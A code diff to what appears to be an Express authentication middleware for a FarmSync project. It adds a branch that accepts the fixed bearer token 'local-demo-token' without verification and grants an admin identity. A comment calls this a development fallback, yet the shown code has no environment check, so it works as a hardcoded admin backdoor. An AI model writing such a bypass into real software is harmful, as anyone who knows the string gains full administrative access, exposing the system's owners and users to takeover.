@@ -25,6 +25,18 @@ export const authenticate = async (
     }
 
     const token = authHeader.substring(7);
+
+    // Development fallback: allow the frontend's local demo token to act as an admin user
+    if (token === 'local-demo-token') {
+      req.user = {
+        id: 'dev-admin',
+        email: 'admin@farmsync.com',
+        role: 'admin',
+      };
+      next();
+      return;
+    }
+
     const decoded = AuthService.verifyToken(token);
 
     const user = await UserModel.findById(decoded.id);
